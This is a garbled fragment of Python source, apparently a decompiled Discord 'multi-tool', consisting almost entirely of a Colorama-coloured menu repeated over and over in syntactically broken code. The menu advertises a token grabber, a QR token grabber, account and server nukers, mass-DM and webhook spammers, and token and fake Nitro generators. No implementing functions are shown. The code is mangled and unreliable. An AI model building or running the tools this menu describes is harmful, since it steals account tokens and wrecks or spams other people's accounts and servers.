Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''](None, None, None)
                if not []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}''']:
                    pass

        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['21'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' GroupChat DC'][f'''{Fore.RESET}''']['        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['29'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' PFP Changer'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['6'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server MassDM   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['14'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' NickName Changer  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['22'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Group Spammer'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['30'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' About'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['7'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Account Nuker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['15'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['23'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Auto Login'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['31'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTRED_EX}'''][' THREADS'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['8'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Nuker    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['16'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' VC Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['24'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Deleter'][f'''{Fore.RESET}''']['          '][f'''{Fore.BLACK}''']['|']
        []['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['1'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Joiner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['9'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}''']['  Channel Spammer   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['17'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Status Changer'][f'''{Fore.RESET}''']['      '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['25'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Generator'][f'''{Fore.RESET}''']['             '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['>'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Next Page'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['2'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Leaver   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['10'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' DM Spammer        '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['18'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Bio Changer'][f'''{Fore.RESET}''']['         '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['26'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Webhook Nitro Generator'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['3'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Checker   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['11'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Friend Spammer    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['19'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Server Lookup'][f'''{Fore.RESET}''']['       '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['27'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' QR Token Grabber'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['4'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Onliner   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['12'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' HypeSquad Joiner  '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['20'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Infomation'][f'''{Fore.RESET}''']['    '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['28'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Member ID Scraper'][f'''{Fore.RESET}''']['\n'][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['5'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Token Grabber   '][f'''{Fore.BLACK}''']['|'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}''']['['][f'''{Fore.WHITE}''']['13'][f'''{Fore.RESET}'''][f'''{Fore.LIGHTMAGENTA_EX}'''][']'][f'''{Fore.RESET}'''][' Reaction Spammer  